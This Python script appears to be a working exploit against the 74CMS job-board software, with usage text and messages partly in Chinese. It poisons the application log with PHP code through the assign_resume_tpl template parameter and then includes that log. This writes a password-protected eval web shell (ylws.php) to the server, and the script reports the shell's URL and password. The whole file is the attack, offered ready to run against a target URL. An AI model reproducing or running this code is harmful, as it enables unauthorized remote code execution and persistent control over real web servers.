#Author：ylws
import sys
import requests
import datetime

def exploit(url):
    try:
        target = url + "/index.php?m=home&a=assign_resume_tpl"
        header = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/'}
        exp1 = {'variable':'1','tpl':'<?php fputs(fopen("ylws.php","w"),"<?php eval(\$_POST[ylws]);?>")?>; ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET[\'id\']"/>'}
        res = requests.post(url=target,data=exp1)
        if res.text.find('WE CAN DO IT JUST THINK') > 0:
            current_time = str(datetime.date.today());
            temp = current_time[2:]
            dispose_time = temp.replace('-','_')
            exp2 = {'variable':'1','tpl':'data/Runtime/Logs/Home/' + dispose_time +'.log'}
            include_res = requests.post(url=target,headers=header,data=exp2,timeout=5)
            if include_res.status_code == 200:
                wsurl = url + '/ylws.php'
                wstext = {'ylws':'echo 1'}
                wsres = requests.post(url=wsurl,headers=header,data=wstext,timeout=5)
                print(wsres.text)
                if wsres.text.find('1'):
                    return '[+]Shell_url:'+ wsurl + " " + 'Password:' + 'ylws'
        else:
            return 1
    except Exception as e:
         return 2

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        url = sys.argv[1]
        res = exploit(url)
        if res != 2 and res != 1:
            print(res)
        elif res == 1: 
            print('[-]目标不存在漏洞!')
        elif res == 2:
            print("[-]网络异常,检测与目标主机通信!")
    else:
        print("python 74CMS_shell.py Target Url")
